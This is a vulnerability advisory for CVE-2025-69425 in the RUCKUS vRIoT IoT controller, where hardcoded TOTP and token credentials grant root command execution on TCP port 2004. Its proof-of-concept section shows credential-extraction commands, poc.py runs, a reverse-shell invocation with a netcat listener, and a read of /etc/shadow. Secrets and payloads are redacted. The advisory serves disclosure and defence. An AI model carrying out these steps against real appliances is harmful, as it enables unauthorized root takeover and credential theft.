# RUCKUS vRIoT: Command Execution as Root via Hardcoded Tokens for the Network-Exposed Service

- **Advisory ID:** MCSAID-2025-013
- **CVE ID:** CVE-2025-69425
- **Product:** RUCKUS IoT Controller (https://support.ruckuswireless.com/products/152-ruckus-iot-controller#f-product-facet=vRIoT)
- **Reported:** 2025-12-08
- **Published:** 2025-12-23
- **Severity:** Critical (10.0)
- **CWE:** [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The RUCKUS vRIoT appliance exposes a command execution service on TCP port 2004, running as the `root` user. The service requires authentication consisting of a Time-based One-Time Password (TOTP) and a static token. However, both the TOTP secret and static token are hardcoded and identical across all deployments. An remote attacker can extract these credentials from the firmware and execute arbitrary commands as root on any vRIoT appliance.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| RUCKUS IoT 2.3.0.0 (GA)                       | Vulnerable                |
| RUCKUS IoT 2.3.1.0 (MR)                       | Vulnerable                |
| RUCKUS IoT 2.4.0.0 (GA)                       | Vulnerable                |
| RUCKUS IoT 3.0.0.0 (GA)                       | Patched                   |

---

## Proof of Concept

### 1. Service Exposure

The `commander.py` script runs as root and listens on all interfaces:

```
root@vriot:/riot/bin# ps -efw | grep commander.py
root         720       1  0 Nov12 ?        00:05:03 /usr/bin/python3 /riot/bin/commander.py

root@vriot:/riot/bin# netstat -antp | grep 2004
tcp        0      0 0.0.0.0:2004            0.0.0.0:*               LISTEN      720/python3
```

### 2. Hardcoded Credentials

The TOTP secret can be extracted from the MongoDB database:

```
root@vriot:/riot/bin# docker exec riot-admin-api python3 -c "
from opspack.sysinfo import config as configfile
import base64
config = configfile.ConfigMongoDbConnector()
token = config.get('prestart_token', eval(base64.b64decode(configfile.envkey())))
print(f'TOTP: {base64.b32encode(token.encode()).decode()}')
"
TOTP: <REDACTED>
```

The static token is hardcoded in `cmd.py`:

```
root@vriot:/riot/bin# grep -r "self.token " /var/lib/docker/overlay2/.../cmd.py
        self.token = "<REDACTED>"
```

### 3. Remote Command Execution

Using the extracted credentials, an attacker can execute arbitrary commands as root:

```
$ python3 poc.py <target_ip> 'whoami;hostname'
[*] Target: <target_ip>
[*] Command: whoami;hostname NO ARGS
[*] Generating TOTP...
[*] Echo: whoami;hostname
[*] Sending payload...
[+] Success!
root
vriot
```

### 4. Reverse Shell

Full system compromise via reverse shell:

```
$ python3 poc.py <target_ip> "python3 -c '<reverse_shell_payload>'"
[*] Target: <target_ip>
[*] Generating TOTP...
[*] Sending payload...
```

On the attacker's machine:

```
$ nc -klvnp 3333
Listening on 0.0.0.0 3333
Connection received on 49798
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
vriot
# grep root /etc/shadow
root::19859:0:99999:7:::
```

---

## Impact

An unauthenticated remote attacker with network access to TCP port 2004 can:

- Execute arbitrary commands as `root`
- Gain complete control of the vRIoT appliance
- Access and manipulate all connected IoT devices managed by the controller
- Pivot to other systems on the network
- Exfiltrate sensitive data
- Deploy persistent backdoors

The severity is Critical (CVSS 10.0) due to unauthenticated remote code execution as root with network-wide IoT device compromise potential.

---

## Mitigations

* **Upgrade to RUCKUS IoT 3.0.0.0 (GA) or later.**
* Restrict network access to TCP port 2004 via firewall rules.
* Isolate vRIoT appliances in a dedicated management VLAN.
* Monitor for suspicious connections to port 2004.
* Reset all credentials after upgrading.

---

## References

* Vendor Advisory: [RUCKUS Security Advisory ID 20251212](https://support.ruckuswireless.com) - "RUCKUS IOT Controller: Vulnerabilities in Management Interface Authentication and Access Control"
